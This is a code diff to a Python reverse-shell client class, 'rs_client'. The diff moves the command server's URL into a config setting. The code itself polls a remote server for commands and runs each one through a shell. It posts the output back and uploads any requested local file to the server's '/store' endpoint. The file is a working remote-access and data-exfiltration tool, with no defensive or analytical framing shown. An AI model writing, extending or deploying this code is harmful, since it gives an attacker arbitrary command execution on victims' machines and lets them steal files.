@@ -3,14 +3,14 @@ import time
 import requests
 import socket
 import os
+from config import App
 
-# This is for a localhost connection, change it in case you're gonna use a public IP or another in general.
-URL = 'http://' + socket.gethostbyname(socket.gethostname())
+
 
 class rs_client:
 
     def create_connection():
-        req = requests.get(URL)
+        req = requests.get(App.config('URL'))
         cmd = req.text
 
         if 'stop' in cmd:
@@ -21,20 +21,20 @@ class rs_client:
             grab,path =  cmd.split('#')
 
             if os.path.exists(path):
-                endpoint = URL + '/store'
+                endpoint = App.config('URL') + '/store'
                 # Dictionary with the file as value.
                 files = {'file':open(path, 'rb')}
                 r = requests.post(endpoint, files=files)
 
             else:
-                post_response = requests.post(url=URL, data='[!] Error: File not found.')
+                post_response = requests.post(url=App.config('URL'), data='[!] Error: File not found.')
 
         else:
             cmdPrompt = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
             # POST result or error.
-            post_response = requests.post(url=URL, data=cmdPrompt.stdout.read() )
-            post_response = requests.post(url=URL, data=cmdPrompt.stderr.read() ) 
+            post_response = requests.post(url=App.config('URL'), data=cmdPrompt.stdout.read() )
+            post_response = requests.post(url=App.config('URL'), data=cmdPrompt.stderr.read() ) 
 
             time.sleep(3)
 
